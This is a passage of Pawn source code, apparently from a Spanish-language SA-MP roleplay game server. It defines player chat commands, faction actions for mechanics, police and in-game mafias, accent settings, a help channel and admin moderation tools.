				    format(string, sizeof(string), "Removiste el Slot 0: %s", Att_Obj_Slot_0[playerid]);
				    Mensaje(playerid, COLOR_GRIS2, string);
				    return Att_Obj_Slot_0[playerid] = "Vacío";
			    }
			    case 1:
			    {
			        RemovePlayerAttachedObject(playerid, 1);
				    format(string, sizeof(string), "Removiste el Slot 1: %s", Att_Obj_Slot_1[playerid]);
				    Mensaje(playerid, COLOR_GRIS2, string);
				    return Att_Obj_Slot_1[playerid] = "Vacío";
			    }
			    case 2:
			    {
                    RemovePlayerAttachedObject(playerid, 2);
				    format(string, sizeof(string), "Removiste el Slot 2: %s", Att_Obj_Slot_2[playerid]);
				    Mensaje(playerid, COLOR_GRIS2, string);
				    return Att_Obj_Slot_2[playerid] = "Vacío";
			    }
			    case 3:
			    {
                    RemovePlayerAttachedObject(playerid, 3);
				    format(string, sizeof(string), "Removiste el Slot 3: %s", Att_Obj_Slot_3[playerid]);
				    Mensaje(playerid, COLOR_GRIS2, string);
				    return Att_Obj_Slot_3[playerid] = "Vacío";
			    }
			    case 4:
			    {
                    RemovePlayerAttachedObject(playerid, 4);
				    format(string, sizeof(string), "Removiste el Slot 4: %s", Att_Obj_Slot_4[playerid]);
				    Mensaje(playerid, COLOR_GRIS2, string);
				    return Att_Obj_Slot_4[playerid] = "Vacío";
				}
			    default: Mensaje(playerid, COLOR_GRIS2, "Slots: 0-4");
			}
		}
		else
		{
		    Mensaje(playerid, COLOR_GRIS2, "- /qobjeto [slot(0-5)]     Remueve un objeto.");
			format(string, sizeof(string), "Slot 0 (MANOS) - %s", Att_Obj_Slot_0[playerid]); Mensaje(playerid, COLOR_GRIS2, string);
			format(string, sizeof(string), "Slot 1 (ESPALDA) - %s", Att_Obj_Slot_1[playerid]); Mensaje(playerid, COLOR_GRIS2, string);
			format(string, sizeof(string), "Slot 2 (CABEZA) - %s", Att_Obj_Slot_2[playerid]); Mensaje(playerid, COLOR_GRIS2, string);
			format(string, sizeof(string), "Slot 3 (OJOS) - %s", Att_Obj_Slot_3[playerid]); Mensaje(playerid, COLOR_GRIS2, string);
			format(string, sizeof(string), "Slot 4 (OTRO) - %s", Att_Obj_Slot_4[playerid]); Mensaje(playerid, COLOR_GRIS2, string);
			return 1;
		}
		return 1;
	}
	// zcmd:job ============================================================================================================================

COMMAND:habilidad(playerid, params[])
{
	new opcion[12], string[144];
	if(sscanf(params, "s[12]", opcion))return Mensaje(playerid, COLOR_GRIS2, "/habilidad [trabajo - armas]");
	
	if(!strcmp("trabajo", opcion))
	{
		for(new i=1;i<12;i++)
		{
			format(string, sizeof(string), "{AA3333}* {FFFF00}[Experiencia: %d]{9EC73D}[Nivel: %d] {FFFFFF}%s", cuenta[playerid][cSkills][i], obtenerNivel(playerid, i), trabajos[i][trabNombre]);
			Mensaje(playerid, -1, string);
		}
	}	
	else if(!strcmp("armas", opcion))
	{
		format(string, sizeof(string), "{AA3333}* {9EC73D}Desert Eagle {FFFF00}[Experiencia: %d/999]", cuenta[playerid][cDesert]);
		Mensaje(playerid, -1, string);
		format(string, sizeof(string), "{AA3333}* {9EC73D}Shotgun {FFFF00}[Experiencia: %d/999]", cuenta[playerid][cEscopeta]);
		Mensaje(playerid, -1, string);
		format(string, sizeof(string), "{AA3333}* {9EC73D}MP5 {FFFF00}[Experiencia: %d/999]", cuenta[playerid][cMP5]);
		Mensaje(playerid, -1, string);
		format(string, sizeof(string), "{AA3333}* {9EC73D}Ak-47 {FFFF00}[Experiencia: %d/999]", cuenta[playerid][cAK47]);
		Mensaje(playerid, -1, string);
		format(string, sizeof(string), "{AA3333}* {9EC73D}M4 {FFFF00}[Experiencia: %d/999]", cuenta[playerid][cM4]);
		Mensaje(playerid, -1, string);
		format(string, sizeof(string), "{AA3333}* {9EC73D}Sniper {FFFF00}[Experiencia: %d/999]", cuenta[playerid][cSniper]);
		Mensaje(playerid, -1, string);
	}
	return 1;
}
    // zcmd: mecas ============================================================================================================================
	command(mm, playerid, params[])
    {
        if(Team_Mecanicos(playerid))
    	{
            if(!IsPlayerInAnyVehicle(playerid))return Mensaje(playerid, COLOR_AMARILLO, "» {FFFFFF}No estás en un vehículo para utilizar las funciones.");
     		if(!booleano[OnDuty]{playerid})return Mensaje(playerid, COLOR_AMARILLO, "» {FFFFFF}No estás de servicio. Ve al lugar indicado para colocarte en servicio.");
	    	return ShowPlayerDialog(playerid, MECANICO_MENU, DIALOG_STYLE_LIST, "-> Mecánico Menú <-", "» Repararaciones\n» Gasolinera\n» Piezas\n» Remolcar {ABD387}(Fuera/Dentro del taller.)\n» Otros {ABD387}(Fuera/Dentro del taller.)\n» Defecto de Fábrica", ">>", "<<");
		}
		else Mensaje(playerid, COLOR_AMARILLO, "No eres mecánico, por lo tanto no puedes utilizar esto.");
		return 1;
    }

//Comandos para embargar [LSPD]
	command(embargar, playerid, params[])
    {
    	if(Team_LSPD(playerid) && cuenta[playerid][cRango] >= 3)
    	{
            if(!IsPlayerInAnyVehicle(playerid))return Mensaje(playerid, COLOR_AMARILLO, "» {FFFFFF}No estás en un vehículo para utilizar las funciones.");
     		if(!booleano[OnDuty]{playerid})return Mensaje(playerid, COLOR_AMARILLO, "» {FFFFFF}No estás de servicio. Ve a la comisaria para ponerte en Servicio.");
	    	return ShowPlayerDialog(playerid, LSPD_EMBARGOS_MENU, DIALOG_STYLE_LIST, "-> Embargos LSPD Menú <-", "» Embargar Vehiculo", ">>", "<<");
		}
		else Mensaje(playerid, COLOR_ROJO, "No eres de la Policia Local o mayor a rango 3!");
		return 1;
    }
    
COMMAND:quitarseguro(playerid, params[])
{
	if(!Team_LSPD(playerid))return Mensaje(playerid, COLOR_GRIS, "Usted no es policía local.");
	if(cuenta[playerid][cRango] < 3)return Mensaje(playerid, COLOR_GRIS, "Usted debe ser nivel 3 o mayor.");
	if(!booleano[OnDuty]{playerid})return Mensaje(playerid, COLOR_AMARILLO, "» {FFFFFF}No estás de servicio. Ve a la comisaria para ponerte en Servicio!");
	new carid = 0;
	static Float:ipos[3];
	for(new i=1;i<MAX_VEHICLES;i++)
	{
		GetVehiclePos(i, ipos[0], ipos[1], ipos[2]);
		if(IsPlayerInRangeOfPoint(playerid, 2.0, ipos[0], ipos[1], ipos[2]))
		{
			carid = 1;
			autos[i][cLock] = false;
			Mensaje(playerid, COLOR_VERDE, "Usted acaba de quitarle el seguro a este vehiculo!");
			return 1;
		}
	}
	if(!carid)return Mensaje(playerid, COLOR_ROJO, "No estas cerca del vehiculo /quitarseguro [ID]");
	return 1;
}

  	command(remolcar, playerid, params[])
	{
	    if(!Team_LSPD(playerid) && cuenta[playerid][cRango] >= 3)return Mensaje(playerid, COLOR_ROJO, "No eres de la Policia Local o mayor a rango 3!");
        Remolcar(playerid);
        return 1;
	}
	
COMMAND:fabricar(playerid, params[])
{
	if(!EsIlegal(playerid))return Mensaje(playerid, COLOR_GRIS, "No perteneces a una mafia.");
	for(new i=0;i<sizeof(fabricas);i++)
	{
		if(IsPlayerInRangeOfPoint(playerid, 60.0, fabricas[i][f@entradasal][3], fabricas[i][f@entradasal][4], fabricas[i][f@entradasal][5]) && fabricas[i][f@world] == GetPlayerVirtualWorld(playerid))
		{
			if(fabricas[i][f@Facc] != cuenta[playerid][cMiembro])return Mensaje(playerid, COLOR_GRIS, "No puedes fabricar aqui, no te pertenece.");
			if(IsPlayerInRangeOfPoint(playerid, 5.0, 2553.8596, -1296.5782, 1031.4219) || IsPlayerInRangeOfPoint(playerid, 5.0, 2547.1018, -1291.6821, 1031.4219) || IsPlayerInRangeOfPoint(playerid, 5.0, 2540.1812, -1295.3416, 1031.4219) || IsPlayerInRangeOfPoint(playerid, 5.0, 2534.2170, -1291.9930, 1031.4219))
			{
				new string[94 * sizeof(packFAB)];
				for(new k=0;k<sizeof(packFAB);k++)
				{
					format(string, sizeof(string), "%s\n{ffffff}%s - {008000}Materiles: %d {ffffff}- {008000}Municion: %d", string, packFAB[k][pf@nombre], packFAB[k][pf@requerido], packFAB[k][pf@unidades]);
				}
				ShowPlayerDialog(playerid, CREATE_WEAPON, DIALOG_STYLE_LIST, "Fábrica de Armas", string, "Aceptar", "Salir");
			}else Mensaje(playerid, COLOR_GRIS, "No puedes fabricar aqui, estas lejos de las mesas."); 
		}
	}
	return 1;
}

command(venderarma, playerid, params[]){
	if(!EsIlegal(playerid))return Mensaje(playerid, COLOR_GRIS, "No perteneces a una mafia.");
	new gunname[12], string[128];
	if(GetPlayerWeapon(playerid) == 0)return Mensaje(playerid, COLOR_GRIS2, "No tienes ningún arma en mano!");
	verificarArmaHack(playerid);
	if(sscanf(params, "ud", params[0], params[1]))return Mensaje(playerid, COLOR_GRIS2, "Utiliza: /venderarma <ID> <precio>");
	if(params[1] < 1 || params[1] > 9999)return Mensaje(playerid, COLOR_GRIS2, "Precio: 1 - 9999$");
	if(IsPlayerConnected(params[0])){
		if(dDistanciaJugador(8.0, playerid, params[0])){
			GetWeaponName(GetPlayerWeapon(playerid), gunname, sizeof(gunname));
			BuyNarco[params[0]] = playerid;
			NarcoSellPrice[params[0]] = params[1];
			NarcoSellArm[params[0]] = GetPlayerWeapon(playerid);
			NarcoSellAmmo[params[0]] = GetPlayerAmmo(playerid);
			format(string, sizeof(string), "\t\tComprar %s (Balas:%d)\n\tEl Narcotraficante %s te ha ofrecido que le compres un arma. ¿Aceptas?", gunname, NarcoSellAmmo[params[0]], PlayerName(playerid));
			EnviarPeticion(params[0], string);
			booleano[Facturing]{params[0]} = true;
			peticiones[params[0]] = 2;
			Mensaje(playerid, COLOR_GRIS2, "- Ofreciste venderle el arma, espera.");
			return 1;
		}else return Mensaje(playerid, COLOR_GRIS2, "Muy lejos de este jugador!");
	}
	return 1;
}

	command(armario, playerid, params[])
	{
	armariolist = LoadModelSelectionMenu("armario.ini");
	ShowModelSelectionMenu(playerid, armariolist, "Armario personal");
	return 1;
	}

    // zcmd : Salirfaccion
    command(salirfaccion, playerid, params[])
    {
      if(cuenta[playerid][cLider] == 0 && cuenta[playerid][cMiembro] == 0)return Mensaje(playerid, COLOR_GRIS2, "No perteneces a ninguna facción."); // Aviso por si no tiene una facción.
      cuenta[playerid][cMiembro] = 0;
      cuenta[playerid][cLider] = 0;
      cuenta[playerid][cRango] = 0;
      GameTextForPlayer(playerid, "HAZ SALIDO DE TU FACCION, AHORA ERES UN CIVIL", 3000, 3);
      SetPlayerSkin(playerid, 299);
      return 1;
    }
    // zcmd: chat ===================================================================================================================
    command(me, playerid, params[])
    {
		if(estaSilenciado(playerid))return 1;
        if(palabrasProhibidas(params[0]))return AccionSPAM(playerid, params[0]);
        if(!sscanf(params, "s[128]", params[0])){
			AccionMe(playerid, params[0]);
        } else Mensaje(playerid, COLOR_GRIS2, "Utiliza: /me <Acción>");
        return 1;
    }
	
command(b, playerid, params[])
{ 
	if(estaSilenciado(playerid)) return 1;
	if(palabrasProhibidas(params[0]))return AccionSPAM(playerid, params[0]);
	if(!sscanf(params, "s[128]", params[0]))
	{
		new string[128]; 
		format(string, sizeof(string), "(( [OOC] %s(%d) dice: %s ))", PlayerName(playerid), playerid, params[0]);
		ProxDetector(20.0, playerid, string, COLOR_BLANCO, COLOR_BLANCO, COLOR_BLANCO, COLOR_BLANCO, COLOR_BLANCO);
	}else Mensaje(playerid, COLOR_GRIS2, "Utiliza: /b <Canal OOC>");
	return 1;
}
	
	
    command(acento, playerid, params[])
	{
		new accent;
		if(sscanf(params, "d", accent)){
			Mensaje(playerid, COLOR_BLANCO, "USO: /acento [id acento]");
			Mensaje(playerid, COLOR_GRIS2, "Acentos: Normal [1], Britanico [2], Asiatico [3, 4, 5], Escocés [6], Irlandés [7], Ruso [8], Americano [9]");
			Mensaje(playerid, COLOR_GRIS2, "Acentos: Español [10], Colombiano [11], Francés [12], Italiano [13], Gangster [14], Australiano [15]");
			Mensaje(playerid, COLOR_GRIS2, "Acentos: Arabe [16], Argentino [17], Canadiense [18] Cubano [19] Israeli [20] Alemán [21] Hippie [22]");
			return 1;
		}
		switch(accent){
			case 1:{
				cuenta[playerid][cAcento] = 1;
				Mensaje(playerid, COLOR_AMARILLO, "» {FFFFFF}Ahora tu acento es Normal, usa /acento para cambiarlo." );
			}
			case 2:{
				cuenta[playerid][cAcento] = 2;
				Mensaje(playerid, COLOR_AMARILLO, "» {FFFFFF}Ahora tu acento es Britanico, usa /acento para cambiarlo." );
			}
			case 3:{
				cuenta[playerid][cAcento] = 3;
				Mensaje(playerid, COLOR_AMARILLO, "» {FFFFFF}Ahora tu acento es Japones, usa /acento para cambiarlo." );
			}
			case 4:{
				cuenta[playerid][cAcento] = 4;
				Mensaje(playerid, COLOR_AMARILLO, "» {FFFFFF}Ahora tu acento es Chino, usa /acento para cambiarlo." );
			}
			case 5:{
				cuenta[playerid][cAcento] = 5;
				Mensaje(playerid, COLOR_AMARILLO, "» {FFFFFF}Ahora tu acento es Koreano, usa /acento para cambiarlo." );
			}
			case 6:{
				cuenta[playerid][cAcento] = 6;
				Mensaje(playerid, COLOR_AMARILLO, "» {FFFFFF}Ahora tu acento es Escocés, usa /acento para cambiarlo." );
			}
			case 7:{
				cuenta[playerid][cAcento] = 7;
				Mensaje(playerid, COLOR_AMARILLO, "» {FFFFFF}Ahora tu acento es Irlandés, usa /acento para cambiarlo." );
			}
			case 8:{
				cuenta[playerid][cAcento] = 8;
				Mensaje(playerid, COLOR_AMARILLO, "» {FFFFFF}Ahora tu acento es Ruso, usa /acento para cambiarlo." );
			}
			case 9:{
				cuenta[playerid][cAcento] = 9;
				Mensaje(playerid, COLOR_AMARILLO, "» {FFFFFF}Ahora tu acento es Americano, usa /acento para cambiarlo." );
			}
			case 10:{
				cuenta[playerid][cAcento] = 10;
				Mensaje(playerid, COLOR_AMARILLO, "» {FFFFFF}Ahora tu acento es Español, usa /acento para cambiarlo." );
			}
			case 11:{
				cuenta[playerid][cAcento] = 11;
				Mensaje(playerid, COLOR_AMARILLO, "» {FFFFFF}Ahora tu acento es Colombiano, usa /acento para cambiarlo." );
			}
			case 12:{
				cuenta[playerid][cAcento] = 12;
				Mensaje(playerid, COLOR_AMARILLO, "» {FFFFFF}Ahora tu acento es Francés, usa /acento para cambiarlo." );
			}
			case 13:{
				cuenta[playerid][cAcento] = 13;
				Mensaje(playerid, COLOR_AMARILLO, "» {FFFFFF}Ahora tu acento es Italiano, usa /acento para cambiarlo." );
			}
			case 14:{
				cuenta[playerid][cAcento] = 14;
				Mensaje(playerid, COLOR_AMARILLO, "» {FFFFFF}Ahora tienes acento Gangster, usa /acento para cambiarlo." );
			}
			case 15:{
				cuenta[playerid][cAcento] = 15;
				Mensaje(playerid, COLOR_AMARILLO, "» {FFFFFF}Ahora tienes acento Australiano, usa /acento para cambiarlo." );
			}
			case 16:{
				cuenta[playerid][cAcento] = 16;
				Mensaje(playerid, COLOR_AMARILLO, "» {FFFFFF}Ahora tienes acento Arabe, usa /acento para cambiarlo." );
			}
			case 17:{
				cuenta[playerid][cAcento] = 17;
				Mensaje(playerid, COLOR_AMARILLO, "» {FFFFFF}Ahora tienes acento Argentino, usa /acento para cambiarlo." );
			}
			case 18:{
				cuenta[playerid][cAcento] = 18;
				Mensaje(playerid, COLOR_AMARILLO, "» {FFFFFF}Ahora tienes acento Canadiense, usa /acento para cambiarlo." );
			}
			case 19:{
				cuenta[playerid][cAcento] = 19;
				Mensaje(playerid, COLOR_AMARILLO, "» {FFFFFF}Ahora tienes acento Cubano, usa /acento para cambiarlo." );
			}
			case 20:{
				cuenta[playerid][cAcento] = 20;
				Mensaje(playerid, COLOR_AMARILLO, "» {FFFFFF}Ahora tienes acento Israeli, usa /acento para cambiarlo." );
			}
			case 21:{
				cuenta[playerid][cAcento] = 21;
				Mensaje(playerid, COLOR_AMARILLO, "» {FFFFFF}Ahora tienes acento Alemán, usa /acento para cambiarlo." );
			}
			case 22:{
				cuenta[playerid][cAcento] = 22;
				Mensaje(playerid, COLOR_AMARILLO, "» {FFFFFF}Ahora tienes acento Hippie, usa /acento para cambiarlo." );
			}
		}
		return 1;
	}
	command(jap, playerid, params[])
	{
	    if(palabrasProhibidas(params[0]))return AccionSPAM(playerid, params[0]);
	    if(!IsPlayerConnected(playerid))return Mensaje(playerid, COLOR_AMARILLO, "»{FFFFFF} No te encuentras conectado.");
        if(!sscanf(params, "s[128]", params[0]))
        {
			new Float:x, Float:y, Float:z, string[128];
    		GetPlayerPos(playerid, x, y, z);
   			for(new i = 0; i < MAX_PLAYERS; i++)
			{
				if(IsPlayerConnected(i))
				{
					if(IsPlayerInRangeOfPoint(i, 20.0, x, y, z))
					{
						if(cuenta[i][cMiembro] == 11 || cuenta[i][cLider] == 11)
						{
					    	format(string, sizeof(string), "%s dice: [Japonés] %s", PlayerName(playerid), params[0]);
					    	Mensaje(i, COLOR_FADE3, string);
						}
						else
						{
					    	format(string, sizeof(string), "%s dice: (Lenguaje desconocido para tí).", PlayerName(playerid));
					    	Mensaje(i, COLOR_FADE3, string);
						}
					}
				}
			}
		}
		else Mensaje(playerid, COLOR_GRIS2, "Utiliza: /jap <Texto>");
		return 1;
	}
    command(c, playerid, params[])
    {
        if(palabrasProhibidas(params[0]))return AccionSPAM(playerid, params[0]);
        if(!sscanf(params, "s[128]", params[0]))
        {
            new string[128];
            if(Maskuse[playerid] == 1)	format(string, sizeof(string), "Desconocido dice: %s", params[0]);
            else format(string, sizeof(string), "%s dice: %s", PlayerName(playerid), params[0]);
			ProxDetector(20.0, playerid, string, COLOR_FADE1, COLOR_FADE2, COLOR_FADE3, COLOR_FADE4, COLOR_FADE5);
        } else Mensaje(playerid, COLOR_GRIS2, "Utiliza: /c <Texto>");
        return 1;
    }
    command(intentar, playerid, params[])
	{
		if(estaSilenciado(playerid))return 1;
	    if(palabrasProhibidas(params[0]))return AccionSPAM(playerid, params[0]);
        if(Intentar[playerid] > 0)return Mensaje(playerid, COLOR_GRIS2, "Espera 10 segundos para volver a utilizar este comando!");
        new randa = random(2)+1, string[128];
        if(sscanf(params, "s[128]", params[0]))return Mensaje(playerid, COLOR_GRIS2, "Utiliza: /intentar <Acción>");
		if(Maskuse[playerid] == 1){
			if(randa == 1){
				format(string, sizeof(string), "* Desconocido consigue %s.", params[0]);
				ProxDetector(20.0, playerid, string, COLOR_VERDE2, COLOR_VERDE2, COLOR_VERDE2, COLOR_VERDE2, COLOR_VERDE2);
			}
			else{
				format(string, sizeof(string), "* Desconocido no logra %s.", params[0]);
				ProxDetector(20.0, playerid, string, COLOR_ROJO4, COLOR_ROJO4, COLOR_ROJO4, COLOR_ROJO4, COLOR_ROJO4);
			}
			Intentar[playerid] = 1;
			SetTimerEx("IntentarTimer", 10000, false, "i", playerid);
		}
		else{
			if(randa == 1){
				format(string, sizeof(string), "* %s consigue %s.", PlayerName(playerid), params[0]);
				ProxDetector(20.0, playerid, string, COLOR_VERDE2, COLOR_VERDE2, COLOR_VERDE2, COLOR_VERDE2, COLOR_VERDE2);
			}
			else{
				format(string, sizeof(string), "* %s no logra %s.", PlayerName(playerid), params[0]);
				ProxDetector(20.0, playerid, string, COLOR_ROJO4, COLOR_ROJO4, COLOR_ROJO4, COLOR_ROJO4, COLOR_ROJO4);
			}
			Intentar[playerid] = 1;
			SetTimerEx("IntentarTimer", 10000, false, "i", playerid);
		}
		return 1;
    }
    command(do, playerid, params[])
	{
		if(estaSilenciado(playerid))return 1;
	    if(palabrasProhibidas(params[0]))return AccionSPAM(playerid, params[0]);
        if(!sscanf(params, "s[128]", params[0]))
        {
            new string[128];
            if(Maskuse[playerid] == 1) format(string, sizeof(string), "* Desconocido (( %s )).", params[0]);
			else format(string, sizeof(string), "* %s (( %s )).", PlayerName(playerid), params[0]);
            ProxDetector(30.0, playerid, string, 0xB6DB22FF, 0xB6DB22FF, 0xB6DB22FF, 0xB6DB22FF, 0xB6DB22FF);
        } else Mensaje(playerid, COLOR_GRIS2, "Utiliza: /do <Acción>");
        return 1;
    }
    command(low, playerid, params[])
	{
		if(estaSilenciado(playerid))return 1;
	    if(palabrasProhibidas(params[0]))return AccionSPAM(playerid, params[0]);
        if(!sscanf(params, "s[128]", params[0]))
        {
            new string[128];
            if(Maskuse[playerid] == 1) format(string, sizeof(string), "Desconocido susurra: %s", params[0]);
			else format(string, sizeof(string), "%s susurra: %s", PlayerName(playerid), params[0]);
            ProxDetector(3.0, playerid, string, COLOR_FADE1, COLOR_FADE2, COLOR_FADE3, COLOR_FADE4, COLOR_FADE5);
        } else Mensaje(playerid, COLOR_GRIS2, "Utiliza: /low <Texto>");
        return 1;
    }
	command(j, playerid, params[])
	{
		if(cuenta[playerid][cAdministrador] < 1)return  Mensaje(playerid, COLOR_GRIS2, "No autorizado!");
		if(!booleano[AntiAbusos]{playerid}){Mensaje(playerid, COLOR_AMARILLO, "»{FFFFFF} No puedes usar este comando sin estar en OnDuty."); return 1;}
		if(!sscanf(params, "s[128]", params[0])){
			new string[128];
			format(string, sizeof(string), "%s Administrador dice: "COL_GRIS"%s", PlayerName(playerid), params[0]);
			ProxDetector(30.0, playerid, string, COLOR_NARANJA, COLOR_NARANJA, COLOR_NARANJA, COLOR_NARANJA, COLOR_NARANJA);
		} else Mensaje(playerid, COLOR_GRIS2, "Utiliza: /j <Texto>");
		return 1;
	}
    command(g, playerid, params[])
    {
		if(estaSilenciado(playerid))return 1;
        if(palabrasProhibidas(params[0]))return AccionSPAM(playerid, params[0]);
        if(!sscanf(params, "s[128]", params[0]))
        {
            new string[128];
            if(Maskuse[playerid] == 1) format(string, sizeof(string), "Desconocido grita:  %s !!", params[0]);
			else format(string, sizeof(string), "%s grita: ¡¡ %s !!", PlayerName(playerid), params[0]);
            ProxDetector(30.0, playerid, string, COLOR_BLANCO, COLOR_BLANCO, COLOR_BLANCO, COLOR_FADE1, COLOR_FADE2);
        } else Mensaje(playerid, COLOR_GRIS2, "Utiliza: /g <Texto>");
        return 1;
    }
    command(w, playerid, params[])
    {
		if(estaSilenciado(playerid))return 1;
        if(!sscanf(params, "us[128]", params[0], params[1]))
        {
            if(params[0] != INVALID_PLAYER_ID)
    		{
	      		if(cuenta[playerid][cAdministrador] > 0 || cuenta[playerid][cAdministrador] == 0 && cuenta[params[0]][cAdministrador] > 0)
	        	{
	         		if(booleano[HidePM]{params[0]} && cuenta[playerid][cAdministrador] < 2013)return Mensaje(playerid, COLOR_GRIS2, "Este administrador/ayudante tiene los susurros bloqueados!");
	         		new string[128];
					format(string, sizeof(string), "Mensaje de %s (%d): %s", PlayerName(playerid), playerid, params[1]);
					Mensaje(params[0], 0xE9BC0AFF, string);
					format(string, sizeof(string), "Susurras a %s (%d): %s", PlayerName(params[0]), params[0] , params[1]);
					Mensaje(playerid, 0xE9BC0AFF, string);
					if(cuenta[playerid][cAdministrador] != 2014 && cuenta[params[0]][cAdministrador] != 2014)
					{
         for(new i=0, _max=GetMaxPlayers();i<_max;i++) 
				    	{
        					if(cuenta[i][cAdministrador] >= 2013)
				    	    {
            					if(See_MP[i] == 1)
				        	    {
                					format(string, sizeof(string), ":MP: %s(%d) a %s(%d): %s", PlayerName(playerid), playerid, PlayerName(params[0]), params[0], params[1]);
				                	Mensaje(i, 0xFF8000FF, string);
					            }
					        }
					    }
 					}
				}
				else Mensaje(playerid, COLOR_GRIS2, "Susurros solo ha administradores!");
			}
			else Mensaje(playerid, COLOR_GRIS2, "Jugador no conectado.");
        }
		else Mensaje(playerid, COLOR_GRIS2, "Utiliza: /w <PlayerID> <Texto>");
        return 1;
    }
    command(aooc, playerid, params[]){
    	if(!booleano[AntiAbusos]{playerid}){
        Mensaje(playerid, COLOR_AMARILLO, "»{FFFFFF} No puedes usar este comando sin estar en OnDuty."); return 1;}
        if(cuenta[playerid][cAdministrador] > 3)
        {
        	if(!sscanf(params, "s[128]", params[0]))
        	{
            	new string[128];
        		format(string, sizeof(string), "[{FFFFFF}AOOC{2684FF}] Admin %s: %s " , PlayerName(playerid), params[0]);
				MensajeGlobal(0x62B382AA, string);
			} else Mensaje(playerid, COLOR_GRIS2, "Utiliza: /aooc <Texto>");
		} else Mensaje(playerid, COLOR_GRIS2, "No autorizado!");
        return 1;
    }
    command(tognew, playerid, params[]){
        if(cuenta[playerid][cAdministrador] < 2013)return Mensaje(playerid, COLOR_GRIS2, "No autorizado!");
        if(!booleano[AntiAbusos]{playerid}){Mensaje(playerid, COLOR_AMARILLO, "»{FFFFFF} No puedes usar este comando sin estar en OnDuty."); return 1;}
        if (!noooc)
        {   noooc = 1; BroadCast(COLOR_AMARILLO, "»{FFFFFF} Canal de Ayuda ha sido desactivado."); }
		else
		{   noooc = 0; BroadCast(COLOR_AMARILLO, "»{FFFFFF} Canal de Ayuda ha sido activado.");  }
        return 1;
    }
  	command(infonew, playerid, params[])
    {
		new string[610];
		new di[] = "{FFFFFF}Este nuevo canal de ayuda es para dar más facilidad a los usuarios menores de nivel 6, ya que los administradores o helpers \nresponderán y si otro user tenia la misma inquietud se habrá respondido su Pregunta rapidamente.\n {26FF67}*Recuerda que solo son para usuarios de nivel 1 al 5.";
		new di2[] = "\n *Si surge algún cRobolema con su cuenta solo Utiliza: /duda.\n *Si sabes rolear y no necesitas este canal usa /togooc\n *No abuses del comando o te banearan del sistema.\n\n\n\t\t\t\t{429EE6}http://www.CenterIsland.com/";
		format(string, sizeof(string), "%s %s", di, di2);
        return ShowPlayerDialog(playerid, 999, DIALOG_STYLE_MSGBOX, "{FF231D}Info del uso de /new", string, "Ok", "" );
	}
	command(258525852, playerid, params[])
    {
    	return ShowPlayerDialog(playerid, IPHONE_AGENDA_ESCRIVIR, DIALOG_STYLE_INPUT, "-> Escribe una nota <-", "A", "Aceptar", "Aceptar");
	}

command(new, playerid, params[]){
	new string[128];
	if(palabrasProhibidas(params[0]))return AccionSPAM(playerid, params[0]);
	if(booleano[NewUsed]{playerid})return Mensaje(playerid, COLOR_AMARILLO, "»{FFFFFF} Para realizar o escribir nuevamente tu duda, necesitas esperar 2 minutos.");
	if(cuenta[playerid][cBanDuda] != 0)return Mensaje(playerid, COLOR_AMARILLO, "»{FFFFFF} No puedes utilizar este comando, estas baneado del sistema de ayuda.");
	if((noooc))return Mensaje(playerid, COLOR_AMARILLO, "»{FFFFFF} El canal de ayuda ha sido deshabilitado por un administrador.");
	if(sscanf(params, "s[128]", params[0]))return Mensaje(playerid, COLOR_GRIS2, "Utiliza: /new <Texto>");
	if(cuenta[playerid][pHelper] == 1){
		format(string, sizeof(string), "(( [%d] Helper %s: %s ))" , playerid, PlayerName(playerid), params[0]);
		OOCOff(COLOR_CHAT_NOTICIAS, string);
	}else if(cuenta[playerid][cNivel] < 1)return Mensaje(playerid, COLOR_AMARILLO, "»{FFFFFF} No puedes usar este canal.");
	booleano[NewUsed]{playerid} = true;
	SetTimerEx("NewUs", 120000, 0, "i", playerid);
	format(string, sizeof(string), "(( [%d] Usuario %s: %s ))" , playerid, PlayerName(playerid), params[0]);
	OOCOff(COLOR_CHAT_NOTICIAS, string);
	return 1;
}

 	command(darhelp, playerid, params[]){
        if(cuenta[playerid][cAdministrador] < 2013)return Mensaje(playerid, COLOR_GRIS2, "No autorizado!");
        if(!booleano[AntiAbusos]{playerid}){Mensaje(playerid, COLOR_AMARILLO, "»{FFFFFF} No puedes usar este comando sin estar en OnDuty."); return 1;}
        if(sscanf(params, "ui", params[0], params[1]))return Mensaje(playerid, COLOR_GRIS2, "Utiliza: /darhelp <ID> <Nivel>");
        if(IsPlayerConnected(params[0])){
			new string[128];
			switch(params[1])
			{
				case 0:
				{
					cuenta[params[0]][pHelper] = 0;
					format(string, sizeof(string), "{40D3FF}%s le ha quitado el nivel de helper.", PlayerName(playerid));
					Mensaje(params[0], -1, string);
					format(string, sizeof(string), "%s le ha quitado el nivel de helper a %s", PlayerName(playerid), PlayerName(params[0]));
					AdminMensaje(string);
				}
				case 1:
				{
					booleano[NewUsed]{playerid} = false;
					cuenta[params[0]][pHelper] = 1;
					format(string, sizeof(string), "{40D3FF}%s lo ha asignado asignado helper. Empieze a responder las dudas [/new]", PlayerName(playerid));
					Mensaje(params[0], -1, string);
					format(string, sizeof(string), "%s ha asignado helper a %s", PlayerName(playerid), PlayerName(params[0]));
					AdminMensaje(string);
				}
				default: Mensaje(playerid, COLOR_GRIS2, "El nivel de helper debe ser entre 0 y 1!");
			}
   		} else Mensaje(playerid, COLOR_GRIS2, " Jugador no conectado.");
        return 1;
    }
    command(mps, playerid, params[])
    {
        if(cuenta[playerid][cAdministrador] < 2013)return Mensaje(playerid, COLOR_GRIS2, "No autorizado!");
        if(!booleano[AntiAbusos]{playerid}){Mensaje(playerid, COLOR_AMARILLO, "»{FFFFFF} No puedes usar este comando sin estar en OnDuty."); return 1;}
        if(See_MP[playerid] == 1)
		{
			See_MP[playerid] = 0;
			Mensaje(playerid, COLOR_GRIS2, "- Notificación de mensajes privados desactivada.");
		}
        else
		{
            See_MP[playerid] = 1;
			Mensaje(playerid, COLOR_GRIS2, "- Notificación de mensajes privados activada.");
		}
        return 1;
    }
    command(usardrogas, playerid, params[])
    {
        if(UsingDrugs[playerid] == 1)return Mensaje(playerid, COLOR_BLANCO, "Estás con el efecto de la droga aún!");
        if(!sscanf(params, "s[32]", params[0]))
        {
            new string[128];
            if(strcmp(params[0], "speed", true) == 0)
	        {
	            if(cuenta[playerid][cSpeed] == 0)return Mensaje(playerid, COLOR_BLANCO, "No tienes Speed!");

	            SetPlayerSkillLevel(playerid, WEAPONSKILL_DESERT_EAGLE, 999);
				SetPlayerSkillLevel(playerid, WEAPONSKILL_SHOTGUN, 999);
				SetPlayerSkillLevel(playerid, WEAPONSKILL_MP5, 999);
				SetPlayerSkillLevel(playerid, WEAPONSKILL_AK47, 999);
				SetPlayerSkillLevel(playerid, WEAPONSKILL_M4, 999);
